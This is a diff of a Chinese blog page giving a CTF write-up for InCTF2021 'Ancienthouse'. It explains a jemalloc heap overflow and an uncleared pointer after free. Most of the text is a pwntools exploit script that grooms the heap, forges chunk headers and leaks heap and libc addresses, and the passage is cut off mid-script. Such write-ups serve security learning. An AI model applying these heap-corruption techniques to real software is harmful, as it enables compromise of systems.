@@ -1,7 +1,5 @@
-<!doctype html><html><head lang=en><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>InCTF2021-Ancienthouse/NodeKeeper-WP - blog of chuj</title><link rel=icon type=image/png href=https://www.cjovi.icu/favicon.ico><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Ancienthouse 这道题用了 2.2.5 版本 jemalloc 作为分配器，而不是传统的 ptmalloc。jemalloc 是 Facebook 开发的一个分配器，在 Firefox 和 redis 中都有应用。据说比 ptmalloc 有更好的性能"><meta property="og:image" content><meta property="og:title" content="InCTF2021-Ancienthouse/NodeKeeper-WP"><meta property="og:description" content="Ancienthouse 这道题用了 2.2.5 版本 jemalloc 作为分配器，而不是传统的 ptmalloc。jemalloc 是 Facebook 开发的一个分配器，在 Firefox 和 redis 中都有应用。据说比 ptmalloc 有更好的性能"><meta property="og:type" content="article"><meta property="og:url" content="https://www.cjovi.icu/wp/1537.html"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-08-16T11:55:00+00:00"><meta property="article:modified_time" content="2021-08-16T11:55:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="InCTF2021-Ancienthouse/NodeKeeper-WP"><meta name=twitter:description content="Ancienthouse 这道题用了 2.2.5 版本 jemalloc 作为分配器，而不是传统的 ptmalloc。jemalloc 是 Facebook 开发的一个分配器，在 Firefox 和 redis 中都有应用。据说比 ptmalloc 有更好的性能"><script src=https://www.cjovi.icu/js/feather.min.js></script>
-<link href=https://www.cjovi.icu/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=https://www.cjovi.icu/css/main.bfb8dec0e2220d86f104bd8230dbf2c35b583e46ccfef90bb620854db94ef7a5.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js></script>
-<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js onload=renderMathInElement(document.body)></script>
-<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script><link rel=stylesheet type=text/css href=https://www.cjovi.icu/css/font.e98a2c89163f90d6fa6d8baf5a50a6561f8ff3d0be1551265f364d138d75df33.css></head><body><div class=content><header><div class=main><a href=https://www.cjovi.icu/>blog of chuj</a></div><nav><a href=/>Home</a>
+<!doctype html><html><head lang=en><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><title>InCTF2021-Ancienthouse/NodeKeeper-WP - blog of chuj</title><link rel=icon type=image/png href=https://www.cjovi.icu/favicon.ico><meta name=viewport content="width=device-width,initial-scale=1">
+<meta name=description content="Ancienthouse 这道题用了 2.2.5 版本 jemalloc 作为分配器，而不是传统的 ptmalloc。jemalloc 是 Facebook 开发的一个分配器，在 Firefox 和 redis 中都有应用。据说比 ptmalloc 有更好的性能"><meta property="og:image" content><meta property="og:title" content="InCTF2021-Ancienthouse/NodeKeeper-WP"><meta property="og:description" content="Ancienthouse 这道题用了 2.2.5 版本 jemalloc 作为分配器，而不是传统的 ptmalloc。jemalloc 是 Facebook 开发的一个分配器，在 Firefox 和 redis 中都有应用。据说比 ptmalloc 有更好的性能"><meta property="og:type" content="article"><meta property="og:url" content="https://www.cjovi.icu/wp/1537.html"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-08-16T11:55:00+00:00"><meta property="article:modified_time" content="2021-08-16T11:55:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="InCTF2021-Ancienthouse/NodeKeeper-WP"><meta name=twitter:description content="Ancienthouse 这道题用了 2.2.5 版本 jemalloc 作为分配器，而不是传统的 ptmalloc。jemalloc 是 Facebook 开发的一个分配器，在 Firefox 和 redis 中都有应用。据说比 ptmalloc 有更好的性能"><script src=https://www.cjovi.icu/js/feather.min.js></script><link href=https://www.cjovi.icu/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=https://www.cjovi.icu/css/main.6dc922b4122291f1967a53b3e802e564596ed5068a8571e4221c9ead17563c3a.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js></script><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js onload=renderMathInElement(document.body)></script><script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script><link rel=stylesheet type=text/css href=https://www.cjovi.icu/css/font.e98a2c89163f90d6fa6d8baf5a50a6561f8ff3d0be1551265f364d138d75df33.css></head><body><div class=content><header><div class=main><a href=https://www.cjovi.icu/>blog of chuj</a></div><nav><a href=/>Home</a>
 <a href=/posts.html>All posts</a>
 <a href=/about.html>About</a>
 <a href=/tags.html>Tags</a></nav></header><main><article><div class=title><h1 class=title>InCTF2021-Ancienthouse/NodeKeeper-WP</h1><div class=meta>Posted on Aug 16, 2021</div></div><section class=body><h2 id=ancienthouse>Ancienthouse</h2><p>这道题用了 2.2.5 版本 jemalloc 作为分配器，而不是传统的 ptmalloc。jemalloc 是 Facebook 开发的一个分配器，在 Firefox 和 redis 中都有应用。据说比 ptmalloc 有更好的性能，特别是在多线程下的表现非常优秀。我也是第一次听说这个东西，为了解题简单地了解了一下。在 csdn 上看到<a href=https://blog.csdn.net/txx_683/article/details/53468211>一个很棒的系列</a>，如果有兴趣跟着这些文章结合源码就可以理解的比较清楚了。我这里不再细讲，只说和题目相关的。</p><p>首先是漏洞点，这个很好发现。merge 操作中的 name 的拼接中存在堆溢出，可以溢出和堆块大小等长的长度</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020;font-weight:700>const</span> <span style=color:#902000>char</span> <span style=color:#666>*</span><span style=color:#007020;font-weight:700>__fastcall</span> <span style=color:#06287e>strcat_name</span>(<span style=color:#007020;font-weight:700>const</span> <span style=color:#902000>char</span> <span style=color:#666>*</span>str1, <span style=color:#902000>char</span> <span style=color:#666>*</span>str2, <span style=color:#902000>unsigned</span> <span style=color:#007020;font-weight:700>__int64</span> tot_len)
@@ -143,146 +141,146 @@
 </span></span><span style=display:flex><span>    free(v6<span style=color:#666>-&gt;</span>data_ptr);
 </span></span><span style=display:flex><span>    free(v6);
 </span></span><span style=display:flex><span>  }
-</span></span></code></pre></div><p>注意到在这个删除下不会清空 data_ptr，就可以 leak 堆地址了。</p><p>具体的流程比较麻烦，我也不想写了，看 exp 应该可以理解。</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>#!/usr/bin/env python
-</span></span><span style=display:flex><span># coding=utf-8
-</span></span><span style=display:flex><span>from pwn import *
-</span></span><span style=display:flex><span>context.log_level = &#39;debug&#39;
-</span></span><span style=display:flex><span>context.terminal = [&#34;tmux&#34;, &#34;splitw&#34;, &#34;-h&#34;]
+</span></span></code></pre></div><p>注意到在这个删除下不会清空 data_ptr，就可以 leak 堆地址了。</p><p>具体的流程比较麻烦，我也不想写了，看 exp 应该可以理解。</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-gdscript3 data-lang=gdscript3><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#!/usr/bin/env python</span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># coding=utf-8</span>
+</span></span><span style=display:flex><span>from pwn import <span style=color:#666>*</span>
+</span></span><span style=display:flex><span>context<span style=color:#666>.</span>log_level <span style=color:#666>=</span> <span style=color:#4070a0>&#39;debug&#39;</span>
+</span></span><span style=display:flex><span>context<span style=color:#666>.</span>terminal <span style=color:#666>=</span> [<span style=color:#4070a0>&#34;tmux&#34;</span>, <span style=color:#4070a0>&#34;splitw&#34;</span>, <span style=color:#4070a0>&#34;-h&#34;</span>]
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>#sh = process(&#34;./chall&#34;)
-</span></span><span style=display:flex><span>sh = remote(&#34;&#34;)
-</span></span><span style=display:flex><span>libc = ELF(&#34;./libc.so.6&#34;)
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#sh = process(&#34;./chall&#34;)</span>
+</span></span><span style=display:flex><span>sh <span style=color:#666>=</span> remote(<span style=color:#4070a0>&#34;&#34;</span>)
+</span></span><span style=display:flex><span>libc <span style=color:#666>=</span> ELF(<span style=color:#4070a0>&#34;./libc.so.6&#34;</span>)
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>def add(length, data):
-</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;&gt;&gt; &#34;, &#39;1&#39;)
-</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;length : &#34;, str(length))
-</span></span><span style=display:flex><span>    sh.sendafter(&#34;data : &#34;, data)
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>add</span>(length, data):
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;&gt;&gt; &#34;</span>, <span style=color:#4070a0>&#39;1&#39;</span>)
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;length : &#34;</span>, <span style=color:#007020>str</span>(length))
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;data : &#34;</span>, data)
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>def Remove(idx, offset):
-</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;&gt;&gt; &#34;, &#39;2&#39;)
-</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;index: &#34;, str(idx))
-</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;all) &#34;, str(offset))
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>Remove</span>(idx, offset):
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;&gt;&gt; &#34;</span>, <span style=color:#4070a0>&#39;2&#39;</span>)
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;index: &#34;</span>, <span style=color:#007020>str</span>(idx))
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;all) &#34;</span>, <span style=color:#007020>str</span>(offset))
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>def link(from_idx, to_idx):
-</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;&gt;&gt; &#34;, &#39;3&#39;)
-</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;to index: &#34;, str(to_idx))
-</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;from index: &#34;, str(from_idx))
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>link</span>(from_idx, to_idx):
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;&gt;&gt; &#34;</span>, <span style=color:#4070a0>&#39;3&#39;</span>)
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;to index: &#34;</span>, <span style=color:#007020>str</span>(to_idx))
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;from index: &#34;</span>, <span style=color:#007020>str</span>(from_idx))
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>def unlink(idx, offset, keep):
-</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;&gt;&gt; &#34;, &#39;4&#39;)
-</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;index: &#34;, str(idx))
-</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;offset: &#34;, str(offset))
-</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;(y/n)? &#34;, keep)
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>unlink</span>(idx, offset, keep):
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;&gt;&gt; &#34;</span>, <span style=color:#4070a0>&#39;4&#39;</span>)
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;index: &#34;</span>, <span style=color:#007020>str</span>(idx))
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;offset: &#34;</span>, <span style=color:#007020>str</span>(offset))
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;(y/n)? &#34;</span>, keep)
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>add(0x28, &#39;idx:0\n&#39;)
-</span></span><span style=display:flex><span>add(0x18, &#39;idx:1\n&#39;)
-</span></span><span style=display:flex><span>add(0x28, &#39;idx:2\n&#39;)
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x28</span>, <span style=color:#4070a0>&#39;idx:0</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x18</span>, <span style=color:#4070a0>&#39;idx:1</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x28</span>, <span style=color:#4070a0>&#39;idx:2</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>link(1, 0)
-</span></span><span style=display:flex><span>link(2, 0)
-</span></span><span style=display:flex><span>unlink(0, 2, &#39;y&#39;)
-</span></span><span style=display:flex><span>Remove(0, 2)
+</span></span><span style=display:flex><span>link(<span style=color:#40a070>1</span>, <span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>link(<span style=color:#40a070>2</span>, <span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>unlink(<span style=color:#40a070>0</span>, <span style=color:#40a070>2</span>, <span style=color:#4070a0>&#39;y&#39;</span>)
+</span></span><span style=display:flex><span>Remove(<span style=color:#40a070>0</span>, <span style=color:#40a070>2</span>)
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>add(0x18, &#39;\n&#39;) # idx: 2
-</span></span><span style=display:flex><span>add(0x28, &#39;idx: 3\n&#39;) # avoid double free err
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x18</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># idx: 2</span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x28</span>, <span style=color:#4070a0>&#39;idx: 3</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># avoid double free err</span>
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>Remove(1, 1337)
+</span></span><span style=display:flex><span>Remove(<span style=color:#40a070>1</span>, <span style=color:#40a070>1337</span>)
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>link(3, 2)
+</span></span><span style=display:flex><span>link(<span style=color:#40a070>3</span>, <span style=color:#40a070>2</span>)
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span># unlink with leak
-</span></span><span style=display:flex><span>sh.sendlineafter(&#34;&gt;&gt; &#34;, &#39;4&#39;)
-</span></span><span style=display:flex><span>sh.sendlineafter(&#34;index: &#34;, str(2))
-</span></span><span style=display:flex><span>sh.recvuntil(&#34;Offset 1 : &#34;)
-</span></span><span style=display:flex><span>heap_base = u64(sh.recv(6).ljust(8, &#39;\x00&#39;)) - 0x310
-</span></span><span style=display:flex><span>log.success(&#34;heap_base: &#34; + hex(heap_base))
-</span></span><span style=display:flex><span>sh.sendlineafter(&#34;offset: &#34;, str(1))
-</span></span><span style=display:flex><span>sh.sendlineafter(&#34;(y/n)? &#34;, &#39;y&#39;)
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># unlink with leak</span>
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;&gt;&gt; &#34;</span>, <span style=color:#4070a0>&#39;4&#39;</span>)
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;index: &#34;</span>, <span style=color:#007020>str</span>(<span style=color:#40a070>2</span>))
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;Offset 1 : &#34;</span>)
+</span></span><span style=display:flex><span>heap_base <span style=color:#666>=</span> u64(sh<span style=color:#666>.</span>recv(<span style=color:#40a070>6</span>)<span style=color:#666>.</span>ljust(<span style=color:#40a070>8</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>)) <span style=color:#666>-</span> <span style=color:#40a070>0x310</span>
+</span></span><span style=display:flex><span><span style=color:#007020>log</span><span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;heap_base: &#34;</span> <span style=color:#666>+</span> hex(heap_base))
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;offset: &#34;</span>, <span style=color:#007020>str</span>(<span style=color:#40a070>1</span>))
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;(y/n)? &#34;</span>, <span style=color:#4070a0>&#39;y&#39;</span>)
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>Remove(0, 1)
+</span></span><span style=display:flex><span>Remove(<span style=color:#40a070>0</span>, <span style=color:#40a070>1</span>)
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span># fake head
-</span></span><span style=display:flex><span>payload = p64(0) + p64(0)
-</span></span><span style=display:flex><span>payload += p64(0) + p64(0x4B1)
-</span></span><span style=display:flex><span>payload += p64(heap_base) + p64(heap_base)
-</span></span><span style=display:flex><span>add(0x38, payload) # idx: 0
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># fake head</span>
+</span></span><span style=display:flex><span>payload <span style=color:#666>=</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0x4B1</span>)
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(heap_base) <span style=color:#666>+</span> p64(heap_base)
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x38</span>, payload) <span style=color:#60a0b0;font-style:italic># idx: 0</span>
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span># fill tcache
-</span></span><span style=display:flex><span>add(0x38, &#39;\n&#39;) # idx: 3
-</span></span><span style=display:flex><span>for i in range(6):
-</span></span><span style=display:flex><span>    add(0x38, &#39;\n&#39;) # idx: 4
-</span></span><span style=display:flex><span>    link(4, 3)
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># fill tcache</span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x38</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># idx: 3</span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(<span style=color:#40a070>6</span>):
+</span></span><span style=display:flex><span>    add(<span style=color:#40a070>0x38</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># idx: 4</span>
+</span></span><span style=display:flex><span>    link(<span style=color:#40a070>4</span>, <span style=color:#40a070>3</span>)
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>Remove(3, 1337)
-</span></span><span style=display:flex><span>Remove(0, 1)
+</span></span><span style=display:flex><span>Remove(<span style=color:#40a070>3</span>, <span style=color:#40a070>1337</span>)
+</span></span><span style=display:flex><span>Remove(<span style=color:#40a070>0</span>, <span style=color:#40a070>1</span>)
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>add(0x48, &#39;\n&#39;) # idx: 0
-</span></span><span style=display:flex><span>for i in range(6):
-</span></span><span style=display:flex><span>    add(0x48, &#39;\n&#39;) # idx: 3
-</span></span><span style=display:flex><span>    link(3, 0)
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x48</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># idx: 0</span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(<span style=color:#40a070>6</span>):
+</span></span><span style=display:flex><span>    add(<span style=color:#40a070>0x48</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># idx: 3</span>
+</span></span><span style=display:flex><span>    link(<span style=color:#40a070>3</span>, <span style=color:#40a070>0</span>)
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>payload = p64(0) * 2
-</span></span><span style=display:flex><span>payload += p64(0x4B0) + p64(0x21) * 6
-</span></span><span style=display:flex><span>add(0x48, payload)
-</span></span><span style=display:flex><span>link(3, 0)
+</span></span><span style=display:flex><span>payload <span style=color:#666>=</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>*</span> <span style=color:#40a070>2</span>
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(<span style=color:#40a070>0x4B0</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0x21</span>) <span style=color:#666>*</span> <span style=color:#40a070>6</span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x48</span>, payload)
+</span></span><span style=display:flex><span>link(<span style=color:#40a070>3</span>, <span style=color:#40a070>0</span>)
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>unlink(0, 7, &#39;y&#39;) # left in idx 3
-</span></span><span style=display:flex><span>Remove(0, 7)
-</span></span><span style=display:flex><span>add(0x18, p64(0) + p64(0x100) + p64(heap_base + 0x3D0 + 0x10))
-</span></span><span style=display:flex><span>Remove(3, 1337)
-</span></span><span style=display:flex><span>for i in range(6):
-</span></span><span style=display:flex><span>    Remove(0, 1)
+</span></span><span style=display:flex><span>unlink(<span style=color:#40a070>0</span>, <span style=color:#40a070>7</span>, <span style=color:#4070a0>&#39;y&#39;</span>) <span style=color:#60a0b0;font-style:italic># left in idx 3</span>
+</span></span><span style=display:flex><span>Remove(<span style=color:#40a070>0</span>, <span style=color:#40a070>7</span>)
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x18</span>, p64(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0x100</span>) <span style=color:#666>+</span> p64(heap_base <span style=color:#666>+</span> <span style=color:#40a070>0x3D0</span> <span style=color:#666>+</span> <span style=color:#40a070>0x10</span>))
+</span></span><span style=display:flex><span>Remove(<span style=color:#40a070>3</span>, <span style=color:#40a070>1337</span>)
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(<span style=color:#40a070>6</span>):
+</span></span><span style=display:flex><span>    Remove(<span style=color:#40a070>0</span>, <span style=color:#40a070>1</span>)
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>for i in range(5):
-</span></span><span style=display:flex><span>    add(0x38, &#39;\n&#39;) # 0
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(<span style=color:#40a070>5</span>):
+</span></span><span style=display:flex><span>    add(<span style=color:#40a070>0x38</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># 0</span>
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>add(0x38, &#39;\n&#39;) # idx: 8
-</span></span><span style=display:flex><span>Remove(0, 1)
-</span></span><span style=display:flex><span>Remove(3, 1)
-</span></span><span style=display:flex><span>Remove(5, 1)
-</span></span><span style=display:flex><span>Remove(6, 1)
-</span></span><span style=display:flex><span>Remove(7, 1)
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x38</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># idx: 8</span>
+</span></span><span style=display:flex><span>Remove(<span style=color:#40a070>0</span>, <span style=color:#40a070>1</span>)
+</span></span><span style=display:flex><span>Remove(<span style=color:#40a070>3</span>, <span style=color:#40a070>1</span>)
+</span></span><span style=display:flex><span>Remove(<span style=color:#40a070>5</span>, <span style=color:#40a070>1</span>)
+</span></span><span style=display:flex><span>Remove(<span style=color:#40a070>6</span>, <span style=color:#40a070>1</span>)
+</span></span><span style=display:flex><span>Remove(<span style=color:#40a070>7</span>, <span style=color:#40a070>1</span>)
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>add(0x28, &#39;\n&#39;) # 0
-</span></span><span style=display:flex><span>add(0x28, &#39;\n&#39;) # 3
-</span></span><span style=display:flex><span>add(0x18, &#39;\n&#39;) # 5
-</span></span><span style=display:flex><span>add(0x18, &#39;\n&#39;) # 6
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x28</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># 0</span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x28</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># 3</span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x18</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># 5</span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x18</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># 6</span>
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>add(0x28, &#39;\n&#39;) # 7
-</span></span><span style=display:flex><span>Remove(5, 1)
-</span></span><span style=display:flex><span>add(0x28, &#39;\n&#39;) # 0
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x28</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># 7</span>
+</span></span><span style=display:flex><span>Remove(<span style=color:#40a070>5</span>, <span style=color:#40a070>1</span>)
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x28</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># 0</span>
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>link(7, 8)
+</span></span><span style=display:flex><span>link(<span style=color:#40a070>7</span>, <span style=color:#40a070>8</span>)
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span># unlink with leak
-</span></span><span style=display:flex><span>sh.sendlineafter(&#34;&gt;&gt; &#34;, &#39;4&#39;)
-</span></span><span style=display:flex><span>sh.sendlineafter(&#34;index: &#34;, str(8))
-</span></span><span style=display:flex><span>sh.recvuntil(&#34;Offset 1 : &#34;)
-</span></span><span style=display:flex><span>libc_base = u64(sh.recv(6).ljust(8, &#39;\x00&#39;)) - libc.sym[&#34;__malloc_hook&#34;] - 0x70
-</span></span><span style=display:flex><span>log.success(&#34;libc_base: &#34; + hex(libc_base))
-</span></span><span style=display:flex><span>sh.sendlineafter(&#34;offset: &#34;, str(1))
-</span></span><span style=display:flex><span>sh.sendlineafter(&#34;(y/n)? &#34;, &#39;y&#39;)
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># unlink with leak</span>
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;&gt;&gt; &#34;</span>, <span style=color:#4070a0>&#39;4&#39;</span>)
